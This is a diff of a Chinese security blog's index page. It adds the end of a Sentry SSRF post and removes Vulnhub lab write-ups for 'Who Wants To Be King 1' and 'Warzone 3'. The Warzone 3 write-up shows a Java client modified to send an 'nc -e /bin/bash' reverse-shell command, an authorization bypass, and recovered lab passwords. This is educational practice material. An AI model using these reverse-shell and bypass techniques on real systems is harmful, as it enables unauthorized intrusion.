class="comment">&quot;colno&quot;</span>:<span class="number">81071</span>,<span class="comment">&quot;function&quot;</span>:<span class="comment">&quot;XMLHttpRequest.o&quot;</span>,<span class="comment">&quot;in_app&quot;</span>:<span class="keyword">true</span>&#125;]&#125;&#125;]&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/19/Sentry-SSRF/1.png" alt="image"></p>
+<p>sentry_version &#x3D; 红线2 （报错可以手动修改几个其他版本试试）<br>sentry_key &#x3D; Raven.config 红线1<br>origin &#x3D; 可以随便写</p>
+</blockquote>
+<h2><span id="repair">Repair</span></h2><blockquote>
+<p>1、sentry关闭 source code scrapping；<br>2、保证配置文件中的黑名单不为空：&#x2F;sentry&#x2F;conf&#x2F;server.py</p>
+</blockquote>
+<h2><span id="reference">Reference</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://hackerone.com/reports/374737">https://hackerone.com/reports/374737</a><br><a target="_blank" rel="noopener" href="https://github.com/xawdxawdx/sentrySSRF">https://github.com/xawdxawdx/sentrySSRF</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSRF/" rel="tag">SSRF</a><a class="tag-none-link" href="/tags/Sentry/" rel="tag">Sentry</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2024/01/19/CVE-2020-11110-Grafana/">
                 Grafana 存储型XSS漏洞（CVE-2020-11110）
             </a>
@@ -733,294 +1021,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Hard-Coding/" rel="tag">Hard Coding</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Sophix/" rel="tag">Sophix</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/12/11/WhoWantsToBeKing-1/">
-                WHO WANTS TO BE KING 1
-            </a>
-        </h2>
-    
-    <time>
-        Dec 11, 2023
-    </time>
-    <section class="content">
-        <h1><span id="who-wants-to-be-king-1">WHO WANTS TO BE KING: 1</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称who-wants-to-be-king-1">名称：Who Wants To Be King: 1</span></h4><h4><span id="发布日期2020121">发布日期：2020.12.1</span></h4><h4><span id="作者bjorn">作者：Bjorn</span></h4><h4><span id="系列who-wants-to-be-king">系列：Who Wants To Be King</span></h4><h4><span id="推特armbjorn">推特：@ArmBjorn</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;nice.txt </p>
-<h4><span id="难度简单">难度：简单</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名whowantstobekingova">文件名：whowantstobeking.ova</span></h4><h4><span id="文件大小24gb">文件大小：2.4GB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomwhowantstobekingwhowantstobekingova">下载地址：</span></h4><h4><span id="md5-5b8bdcc5c24a3705c88f969b47a7199b">MD5: 5B8BDCC5C24A3705C88F969B47A7199B</span></h4><h4><span id="sha1-0114959a45db91f699594d1476ab900f610681ca">SHA1: 0114959A45DB91F699594D1476AB900F610681CA</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机whowantstobeking和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2023/12/11/WhoWantsToBeKing-1/1.png" alt="image"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/WhoWantsToBeKing-1/2.png" alt="image"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/WhoWantsToBeKing-1/3.png" alt="image"></p>
-<p>2.再进行端口扫描，发现只开放了22和80端口，访问主页，发现skeylogger文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.121 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/WhoWantsToBeKing-1/4.png" alt="image"></p>
-<p><img src="/2023/12/11/WhoWantsToBeKing-1/5.png" alt="image"></p>
-<p>3.最后再进行一下目录扫描，没有什么发现：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.121 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/WhoWantsToBeKing-1/6.png" alt="image"></p>
-</blockquote>
-<h3><span id="文件解密ssh登录">文件解密，SSH登录</span></h3><blockquote>
-<p>1.将skeylogger文件下载到本地，查看文件属性发现是二进制文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file skeylogger</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/WhoWantsToBeKing-1/7.png" alt="image"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -all skeylogger</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/WhoWantsToBeKing-1/8.png" alt="image"></p>
-<p>2.再利用strings命令看看文件中有没有隐藏什么字符串，发现了一串base编码的字符串：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings skeylogger</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/WhoWantsToBeKing-1/9.png" alt="image"></p>
-<p>3.将字符串解码，得到dracarys，这个到底是用户名还是密码我们不得而知，于是搜索一下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ZHJhY2FyeXMK | base64 -d</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/WhoWantsToBeKing-1/10.png" alt="image"></p>
-<p>4.从网络查询我们可知，“Dracarys”来自奇幻作品《冰与火之歌》中高等瓦雷利亚语中的“龙焰”，是“龙之母”丹妮莉丝·坦格利安驾驭巨龙之火时使用的口号。靶机开放了22端口，所以很可能用户名是deanerys：</p>
-<p><img src="/2023/12/11/WhoWantsToBeKing-1/11.png" alt="image"></p>
-<p><img src="/2023/12/11/WhoWantsToBeKing-1/12.png" alt="image"></p>
-</blockquote>
-<h3><span id="初步提权">初步提权</span></h3><blockquote>
-<p>1.SSH登录后，查看文件权限，有两个程序可以利用：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/WhoWantsToBeKing-1/13.png" alt="image"></p>
-<p>2.但在&#x2F;usr&#x2F;lib&#x2F;linuxmint&#x2F;mintUpdate目录下没有那两个文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/lib/linuxmint/mintUpdate</span><br><span class="line">ls -la</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/WhoWantsToBeKing-1/14.png" alt="image"></p>
-<p>3.回到～目录下，发现在.local&#x2F;share目录下有一个daenerys.zip，解压出来的文件是djkdsnkjdsn，我们查看后提示我们note.txt的文件路径：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.local/share</span><br><span class="line">ls -la</span><br><span class="line"></span><br><span class="line">unzip daenerys.zip</span><br><span class="line">cat djkdsnkjdsn</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/WhoWantsToBeKing-1/15.png" alt="image"></p>
-<p>4.查看note.txt，得到提示，再次网络搜索，得到khaldrogo的全名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/sounds/note.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/WhoWantsToBeKing-1/16.png" alt="image"></p>
-<p><img src="/2023/12/11/WhoWantsToBeKing-1/17.png" alt="image"></p>
-</blockquote>
-<h3><span id="flag获取">Flag获取</span></h3><blockquote>
-<p>1.khaldrogo就是root用户的密码，登录后在&#x2F;root目录下能够找到flag，即nice.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line"></span><br><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat nice.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/WhoWantsToBeKing-1/18.png" alt="image"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WhoWantsToBeKing/" rel="tag">WhoWantsToBeKing</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/12/11/Warzone-3/">
-                WARZONE 3
-            </a>
-        </h2>
-    
-    <time>
-        Dec 11, 2023
-    </time>
-    <section class="content">
-        <h1><span id="warzone-3">WARZONE: 3</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称warzone-3">名称：Warzone: 3</span></h4><h4><span id="发布日期20201121">发布日期：2020.11.21</span></h4><h4><span id="作者al1enum">作者：AL1ENUM</span></h4><h4><span id="系列warzone">系列：Warzone</span></h4><h4><span id="推特-al1enum">推特: @AL1ENUM</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>anunnaki:&#x2F;~&#x2F;underboss.txt<br>root:&#x2F;root&#x2F;boss.txt </p>
-<h4><span id="难度困难">难度：困难</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名warzone3ova">文件名：Warzone3.ova</span></h4><h4><span id="文件大小25gb">文件大小：2.5GB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomwarzonewarzone3ova">下载地址：</span></h4><h4><span id="md5-3d82ab48e81bb31ee817eaecd8998747">MD5: 3D82AB48E81BB31EE817EAECD8998747</span></h4><h4><span id="sha1-8221a1683e3836903d050bf24e6e6601c72508b0">SHA1: 8221A1683E3836903D050BF24E6E6601C72508B0</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机warzone3和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2023/12/11/Warzone-3/1.png" alt="image"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-3/2.png" alt="image"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-3/3.png" alt="image"></p>
-<p>2.再进行端口扫描，发现开放了21，22和4444端口，都是无法网页访问的：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.130 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-3/4.png" alt="image"></p>
-</blockquote>
-<h3><span id="ftp匿名登录">FTP匿名登录</span></h3><blockquote>
-<p>1.来到21端口，我们发现ftp服务可匿名登录：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.56.130</span><br><span class="line">anonymous</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-3/5.png" alt="image"></p>
-<p>2.在&#x2F;pub目录下我们能发现note.txt及alienclient.jar，全部获取到kali查看一下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd pub</span><br><span class="line">ls -la</span><br><span class="line">get note.txt</span><br><span class="line">get alienclient.jar</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-3/6.png" alt="image"></p>
-<p>3.在note.txt中有用户名alienum和密码exogenesis：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat note.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-3/7.png" alt="image"></p>
-<p>4.运行alienclient.jar，发现是一个登录器，输入用户密码登录并没有反应：</p>
-<p><img src="/2023/12/11/Warzone-3/8.png" alt="image"></p>
-</blockquote>
-<h3><span id="alienclientjar反编修改">alienclient.jar反编修改</span></h3><blockquote>
-<p>1.我们将alienclient.jar反编译回.java的组成（<a target="_blank" rel="noopener" href="http://www.javadecompilers.com/%EF%BC%89%EF%BC%8C%E5%9C%A8Starter.java%E7%9A%84actionPerformed%E6%96%B9%E6%B3%95%E4%B8%AD%EF%BC%8C%E5%88%A4%E6%96%AD%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E6%97%B6%EF%BC%8C%E7%94%B1%E4%BA%8E%E5%AD%98%E5%9C%A8%E6%9C%AC%E5%9C%B0%E9%89%B4%E6%9D%83%E9%97%AE%E9%A2%98%EF%BC%8C%E5%9C%A8%E5%88%A4%E6%96%AD%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E5%89%8D%E9%9C%80%E6%B7%BB%E5%8A%A0%E4%B8%80%E5%8F%A5role">http://www.javadecompilers.com/），在Starter.java的actionPerformed方法中，判断用户权限时，由于存在本地鉴权问题，在判断用户权限前需添加一句role</a> &#x3D; “astronaut”;来提升权限：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (e.getSource() == <span class="built_in">this</span>.viewButton)</span><br><span class="line">  role = <span class="string">&quot;astronaut&quot;</span>; <span class="comment">/*代码修改处*/</span></span><br><span class="line">  <span class="keyword">if</span> (Starter.role.equals(<span class="string">&quot;researcher&quot;</span>)) &#123;</span><br><span class="line">    JOptionPane.showMessageDialog(<span class="built_in">this</span>, <span class="string">&quot;Permission Denied&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (role.equals(<span class="string">&quot;astronaut&quot;</span>)) &#123;</span><br></pre></td></tr></table></figure>
-
-<p>2.继续跟代码，发现reportList是执行代码list.setCmd(“tail -5 “ + f);，于是将它更改为list.setCmd(“nc -e &#x2F;bin&#x2F;bash 192.168.56.102 9002”);，并且将所有warzone.local改为靶机ip，重新编译成.jar，在kali开启对应端口监听，输入用户密码执行后，点击view：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(<span class="keyword">final</span> ActionEvent e)</span> &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">      Starter.<span class="built_in">this</span>.socket = <span class="keyword">new</span> <span class="title class_">Socket</span>(<span class="string">&quot;warzone.local&quot;</span>, <span class="number">4444</span>);</span><br><span class="line">      Starter.<span class="built_in">this</span>.os = <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Starter.<span class="built_in">this</span>.socket.getOutputStream());</span><br><span class="line">      <span class="keyword">final</span> <span class="type">RE</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RE</span>();</span><br><span class="line">      list.setToken(Starter.token);</span><br><span class="line">      list.setOption(<span class="string">&quot;VIEW&quot;</span>);</span><br><span class="line">      list.setValue(<span class="string">&quot;VALUE&quot;</span>);</span><br><span class="line">      list.setCmd(<span class="string">&quot;nc -e /bin/bash 192.168.56.102 9002&quot;</span>);  <span class="comment">/*代码修改处*/</span></span><br><span class="line">      Starter.<span class="built_in">this</span>.os.writeObject(list);</span><br><span class="line">      Starter.<span class="built_in">this</span>.is = <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Starter.<span class="built_in">this</span>.socket.getInputStream());</span><br><span class="line">      <span class="keyword">final</span> <span class="type">RE</span> <span class="variable">response</span> <span class="operator">=</span> (RE)Starter.<span class="built_in">this</span>.is.readObject();</span><br><span class="line">      Starter.<span class="built_in">this</span>.os.close();</span><br><span class="line">      Starter.<span class="built_in">this</span>.socket.close();</span><br><span class="line">      Starter.<span class="built_in">this</span>.reportValue(response.getValue());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">nc -lvnp <span class="number">9002</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-3/9.png" alt="image"></p>
-<p><img src="/2023/12/11/Warzone-3/10.png" alt="image"></p>
-</blockquote>
-<h3><span id="初步提权">初步提权</span></h3><blockquote>
-<p>1.在exomorph用户目录下能够发现aliens.encrypted和wrz3encryptor.jar，都获取到kali：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">ls -la</span><br><span class="line">python3 -m http.server 8001，exomorph开放http服务</span><br><span class="line"></span><br><span class="line">wget http://192.168.56.130:8001/aliens.encrypted，kali获取</span><br><span class="line">wget http://192.168.56.130:8001/wrz3encryptor.jar</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-3/11.png" alt="image"></p>
-<p><img src="/2023/12/11/Warzone-3/12.png" alt="image"></p>
-<p>2.再次对wrz3encryptor.jar进行反编，然后发现是AES的加密，可以写出解密方法：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">decrypt</span><span class="params">(String key, File inputFile, File outputFile)</span> &#123;</span><br><span class="line">  doDeCrypto(<span class="number">2</span>, key, inputFile, outputFile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doDeCrypto</span><span class="params">(<span class="type">int</span> cipherMode, String key, File inputFile, File outputFile)</span> &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">Key</span> <span class="variable">secretKey</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(key.getBytes(), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">    <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">    cipher.init(cipherMode, secretKey);</span><br><span class="line">    <span class="type">FileInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(inputFile);</span><br><span class="line">    <span class="type">byte</span>[] inputBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>)inputFile.length()];</span><br><span class="line">    inputStream.read(inputBytes);</span><br><span class="line">    <span class="type">byte</span>[] outputBytes = cipher.doFinal(inputBytes);</span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(outputFile);</span><br><span class="line">    outputStream.write(outputBytes);</span><br><span class="line">    inputStream.close();</span><br><span class="line">    outputStream.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">      ex.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-
-<p>3.对aliens.encrypted进行解密后，我们可以发现anunnaki用户及其密码：</p>
-<p><img src="/2023/12/11/Warzone-3/13.png" alt="image"></p>
-<p>4.可以通过ssh登录anunnaki用户，在用户目录下获得第一个flag，underboss.txt：</p>
-<p><img src="/2023/12/11/Warzone-3/14.png" alt="image"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.在&#x2F;home&#x2F;anunnaki目录下还可以发现secpasskeeper.jar.gpg文件，利用gpg解密：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg -o secpasskeeper.jar -d secpasskeeper.jar.gpg #passphrase为nak1nak1..</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-3/15.png" alt="image"></p>
-<p>2.解密后能得到secpasskeeper.jar文件，继续对其反编后，修改main方法：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvalidKeyException, NoSuchPaddingException, NoSuchAlgorithmException, BadPaddingException, IllegalBlockSizeException, UnsupportedEncodingException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">      System.out.println(<span class="string">&quot;[Warzone 3] Root&#x27;s Password Manager&quot;</span>);</span><br><span class="line">      System.out.print(<span class="string">&quot;Secret passphrase : &quot;</span>);</span><br><span class="line">      <span class="type">String</span> <span class="variable">secret</span> <span class="operator">=</span> in.nextLine();</span><br><span class="line">      <span class="type">Cryptor</span> <span class="variable">cryptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cryptor</span>();</span><br><span class="line">      <span class="type">Resources</span> <span class="variable">res</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Resources</span>();</span><br><span class="line">      <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> cryptor.decrypt(secret, removeSalt(res.getCipher()));</span><br><span class="line">      <span class="type">String</span> <span class="variable">sys</span> <span class="operator">=</span> cryptor.decrypt(cryptor.decrypt(res.gotSecret(), removeSalt(res.getSecret())), removeSalt(res.getCipher()));</span><br><span class="line">      <span class="keyword">if</span> (<span class="literal">true</span><span class="comment">/*user.equals(sys)*/</span>) &#123; <span class="comment">/*代码修改处*/</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">plaintext</span> <span class="operator">=</span> cryptor.decrypt(cryptor.decrypt(res.gotSecret(), removeSalt(res.getSecret())), removeSalt(res.getCipher()));</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Success, the password is : &quot;</span> + plaintext);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[x] Failed&quot;</span>);</span><br><span class="line">      &#125; </span><br><span class="line">    &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;[!] Terminated&quot;</span>);</span><br><span class="line">      System.exit(<span class="number">0</span>);</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-
-<p>3.随意传递参数输入，可以得到root的密码为ufo_phosXEN，现在可以提权到root，并且在&#x2F;root目录下发现第二个flag，boss.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat boss.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-3/16.png" alt="image"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/Warzone/" rel="tag">Warzone</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/12/11/Warzone-2/">
-                WARZONE 2
-            </a>
-        </h2>
-    
-    <time>
-        Dec 11, 2023
-    </time>
-    <section class="content">
-        <h1><span id="warzone-2">WARZONE: 2</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称warzone-2">名称：Warzone: 2</span></h4><h4><span id="发布日期2020119">发布日期：2020.11.9</span></h4><h4><span id="作者al1enum">作者：AL1ENUM</span></h4><h4><span id="系列warzone">系列：Warzone</span></h4><h4><span id="推特-al1enum">推特: @AL1ENUM</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>admiral:&#x2F;~&#x2F;Desktop&#x2F;silver.txt<br>root:&#x2F;root&#x2F;Desktop&#x2F;gold.txt </p>
-<h4><span id="难度中等">难度：中等</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
